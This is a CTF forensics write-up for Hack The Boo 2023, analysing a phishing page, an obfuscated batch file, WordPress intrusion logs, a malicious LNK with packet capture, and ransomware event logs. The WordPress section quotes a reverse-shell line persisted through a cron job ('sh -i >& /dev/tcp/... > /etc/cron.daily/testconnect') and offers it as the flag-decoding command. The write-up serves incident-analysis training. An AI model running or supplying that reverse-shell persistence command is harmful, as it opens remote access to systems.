---
title: Hack the Boo 2023 - Writeups
date: 2023-10-28 12:00:00
categories: [ctf]
tags: [forensics,htb]
---

# Forensics
## Scenario (Practice Challenges)
> Prepare yourselves, travelers! <br><br>
Creatures have been stirring in the depths of night. Monstrosities emboldened by the lack of monster slayers have heard their names spoken under fearful breaths. As the Hack The Boo tales are brought to life over a campfire, the unsuspecting villagers cling to the light of the fire in hopes of an even brighter dawn. <br><br>
The elders are here to guide you in your battles...

## Task 1: Spooky Phishing
Question: A few citizens of the Spooky Country have been victims of a targeted phishing campaign. Inspired by the Halloween spirit, none of them was able to detect attackers trap. Can you analyze the malicious attachment and find the URL for the next attack stage?

Flag: `HTB{sp00ky_ph1sh1ng_w1th_sp00ky_spr34dsh33ts}`

We are given the following file:
* `index.html`: HTML page containing the phishing mechanism.

Analyzing the source code, several encoded codes cane be identified in the tags highlighted.

![phishing1](/assets/posts/htboo2023/phishing1.png)

Let us start analyzing the `<script>` tag in HTML is used to include JavaScript code in a web page. 
1. `data`: - This specifies that the URL is a data URI. 
2. `text/javascript;base64`: - This part of the URL indicates that the data is encoded as Base64 and represents `JavaScript` code.

Hence, the whole section can be decoded from Base64 and the script code can then be analyzed further.

![phishing2](/assets/posts/htboo2023/phishing2.png)

Notice how the script initiates two variables, `nn` and `aa`. These variables contain the result of the `decodeHex` function given the two hidden values as parameter each time, after the result of the `atob` function (atob decodes data that has been encoded with base64). 

![phishing3](/assets/posts/htboo2023/phishing3.png)

One way is to analyze the `decodeHex` function. By concatenating the two hidden strings in the html file and decoding it with Base64 first and then hex, the flag can be retrieved.

![phishing4](/assets/posts/htboo2023/phishing4.png)

Another way is to just enter the website as it will redirect us to an error page with the flag present in its URL. However, this was just an error from HTB after getting confirmation from a HTB staff on Discord.

![phishing5](/assets/posts/htboo2023/phishing5.png)

![phishing6](/assets/posts/htboo2023/phishing6.png)

## Task 2: Bat Problems
Question: On a chilly Halloween night, the town of Hollowville was shrouded in a veil of mystery. The infamous "Haunted Hollow House", known for its supernatural tales, concealed a cryptic document. Whispers in the town suggested that the one who could solve its riddle would reveal a beacon of hope. As an investigator, your mission is to decipher the script's enigmatic sorcery, break the curse, and unveil the flag to become Hollowville's savior.

Flag: `HTB{0bfusc4t3d_b4t_f1l3s_c4n_b3_4_m3ss}`

We are given the following file:
* `payload.bat`: Malicious bat file.

As we can see from the following image, the script contains random variables that are assigned with random values. In a batch script (a .bat or .cmd file), the set command defines and manipulates environment variables which store information that can be used by the script or other programs running in the same environment (the Command Prompt session).

![bat1](/assets/posts/htboo2023/bat1.png)

The file can be analyzed using `Any.Run`, the results show three actions made:
1. The attacker can be seen using cmd to copy PowerShell to a different path with a random name (Earttxmxaqr.png). 
1. The attacker then uses cmd again to rename the downloaded bat file and also change it's extension to `.png.bat` to avoid detection.
1. The attacker executes the base64 encoded string using the renamed PowerShell executable.

![bat2](/assets/posts/htboo2023/bat2.png)

By decoding the string, the flag can be retrieved.

![bat3](/assets/posts/htboo2023/bat3.png)

## Task 3: Vulnerable Season
Question: Halloween season is a very busy season for all of us. Especially for web page administrators. Too many Halloween-themed parties to attend, too many plugins to manage. Unfortunately, our admin didn't update the plugins used by our WordPress site and as a result, we got pwned. Can you help us investigate the incident by analyzing the web server logs?

Flag: `HTB{L0g_@n4ly5t_4_bEg1nN3r}`

We are given the following file:
* `access.log`: Wordpress server logs.

In the log file, notice there are several requests related to a WordPress website. Analyzing the logs, `82.179.92.206` has performed the most requests out of the IP addresses, indicating a suspicious activity. So we can find the amount of times an IP addresses was involved by the number of requests.
```
cat access.log | cut -d " " -f 1 | sort | uniq -c
```

![vul1](/assets/posts/htboo2023/vul1.png)

By reading the instructions, they mentioned that the attacker may have exploited a vulnerability in a plugin. 
Hence, the search can be easier by filtering the logs using "wp-content/plugins/" which is the directory storing all the plugins. Requests from 82.179.92.206 with response status code of 200 are the key to identifying the vulnerability, as these can reveal whether the attacker's attempts were successful. 

By analyzing the logs, notice how some requests suggest that the attacker has exploited the `wp-upg` plugin since the plugin was responding with 200 OK messages. Additionally, `wp-upg` has certain vulnerabilities such as CVE-2022-4060 and CVE-2023-0039

![vul2](/assets/posts/htboo2023/vul2.png)

After identifying the vulnerable plugin, the logs are analyzed further and another important log was found. These requests indicate the attacker was attempting to execute arbitrary commands on the system.

![vul3](/assets/posts/htboo2023/vul3.png)

One of the requests creates a cron job named `testconnect` that connects to a Command and Control (CnC) server and prints the flag.

![vul4](/assets/posts/htboo2023/vul4.png)

![vul5](/assets/posts/htboo2023/vul5.png)

At this point, I was stuck and required help from the HTB writeup. I found out that to retrieve the flag was to decode the URL using the `testconnect` cron job again. This can be done using the command:
```
echo "sh -i >& /dev/tcp/82.179.92.206/7331 0>&1" > /etc/cron.daily/testconnect && Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo $Mz$Tz$Vz$az$Kz$Oz|base64 -d|rev
```

![vul6](/assets/posts/htboo2023/vul6.png)

## Scenario (Competition Challenges)
> Are you afraid of the dark? <br><br>
A fog begins to hang over the villagers, as the denizens of the night have sensed their location deep in the forest. Tooth, claw, and hoof press forward to devour their prey.A grim future awaits our stalwart storytellers. It’s up to you, slayers! <br><br>
Crush this CTF and save the villagers from their peril. Beware! You won't be getting any help here...

## Task 1: Trick or Treat
Question: Another night staying alone at home during Halloween. But someone wanted to play a Halloween game with me. They emailed me the subject "Trick or Treat" and an attachment. When I opened the file, a black screen appeared for a second on my screen. It wasn't so scary; maybe the season is not so spooky after all.

Flag: `HTB{s4y_Pumpk1111111n!!!}`

We are given the following file:
* `capture.pcap`: Packet capture file
* `trick_or_treat.lnk`: The malicious file

Since the malicious file is provided by HTB, we can first gain additional information on it through `VirusTotal`, a famous OSINT website. After scanning, the file shows that it is indeed malicious and it connects to a malicious domain called `windowsliveupdater.com`. We also can notice that the file is connected to a few IP addresses, mainly `209.197.3.8` which is the malicious one.

![trick1](/assets/posts/htboo2023/trick1.png)

Analyzing further, we can understand what kind of processes are executed by the malicious file and how it attacks a system.

As shown in the picture below, the malicious file seems to download malicious data from `http://windowsliveupdater.com` using a random User-Agent for HTTP requests to essentially mask its identity on the network. It then sets the downloaded data into a variable (`$vurnwos`) and processes the characters in pairs and converts them from hexadecimal representation to their actual characters. It then performs a bitwise XOR operation with 0x1d on each character and the output is appended to the `$vurnwos` string. Finally, it executes the variable using `Invoke-Command`. It also attempts to execute an empty variable (`$asvods`).

![trick2](/assets/posts/htboo2023/trick2.png)

After knowing what the malicious file does, the packet capture file can be analyzed using Wireshark to find the downloaded content. Since we know that the malicious file requested data from a website, we can filter `HTTP` packets only.

![trick3](/assets/posts/htboo2023/trick3.png)

Going through the HTTP packets, we find a packet that shows the victim sending a GET request to `http://windowsliveupdater.com`. Analyzing the `User-Agent`, we can see that it is one of the randomized user agents set in the malicious file.

![trick4](/assets/posts/htboo2023/trick4.png)

Now we know that that the IP address `77.74.198.52` is responsible for the malicious file execution, we can check its HTTP response. Notice that the HTTP response packet has a cleartext data that is truncated because it is too long for Wireshark. The data is our key to getting the flag and it must be extracted using the decoding method specified in the malicious file.

![trick5](/assets/posts/htboo2023/trick5.png)

![trick6](/assets/posts/htboo2023/trick6.png)

Since we know that the downloable content is encoded in hex and also XOR'ed, we can use `CyberChef` to extract the content.

![trick7](/assets/posts/htboo2023/trick7.png)

## Task 2: Valhalloween
Question: As I was walking the neighbor's streets for some Trick-or-Treat, a strange man approached me, saying he was dressed as "The God of Mischief!". He handed me some candy and disappeared. Among the candy bars was a USB in disguise, and when I plugged it into my computer, all my files were corrupted! First, spawn the haunted Docker instance and connect to it! Dig through the horrors that lie in the given Logs and answer whatever questions are asked of you!

Flag: `HTB{N0n3_c4n_ru1n_th3_H@ll0w33N_Sp1r1t}`

We are given the following file:
* `Logs`: Directory containing various Windows XML EventLog (.evtx) files

In this challenge, we are given a series of questions that must be answered to obtain the flag. These answers can all be located in certain event log files provided by HTB.

![val1](/assets/posts/htboo2023/val1.png)

1. To complete this question, we can analyze the `Security` log file and filter the logs with event ID 4688 which is normally logged in Event Viewer when a new process is created. After filtering the results, we find a Powershell script that was executed to download the ransomware ('mscalc.exe') from a malicious server with its IP address and port. Additionally, we now know the estimated time of the ransomware attack is around 11:03:24 AM on 20/9/2023.

![val2](/assets/posts/htboo2023/val2.png)

2. To complete this question, we can analyze the `sysmon` log file and filter the logs with event ID 1 which is normally logged in Event Viewer when a new process is created. After filtering the results and since we know the Powershell script downloads the ransomware, we can attempt to find its child processes to locate the creation process of the ransomware. After analyzing the logs, we can find the ransomware with its MD5 hash.

![val3](/assets/posts/htboo2023/val3.png)

3. To complete this question, just put the ransomware's MD5 hash to any OSINT tool and check its family labels.

![val4](/assets/posts/htboo2023/val4.png)

4. To complete this question, we can analyze the `sysmon` log file and filter the logs with keyword 'schtasks' which is the name for task scheduling process. After filtering the results, we find a schtasks program with the parent process being the ransomware.

![val5](/assets/posts/htboo2023/val5.png)

5. To complete this question, we can analyze the `sysmon` log file and check the ransomware process again. Viewing the XML format of the ransomware process, we can easily find the parent process name and ID of the ransomware process.

![val6](/assets/posts/htboo2023/val6.png)

6. To complete this question, we need to find the root process that spawned the ransomware. Hence, we can use the PPID to retrace the steps to the initial stage in the infection chain. 

The infection chain would look like this:
```
WINWORD.EXE with Unexpe.docx (7280) => cmd.exe (8776) => powershell.exe (3856) => mscalc.exe (7528)
```

![val7](/assets/posts/htboo2023/val7.png)
![val8](/assets/posts/htboo2023/val8.png)
![val9](/assets/posts/htboo2023/val9.png)

7. To complete this question, we can just view the XML format of the `.docx` file and find the `TimeCreated SystemTime` row. ENSURE THE TIME FORMAT IS IN UTC!

![val10](/assets/posts/htboo2023/val10.png)
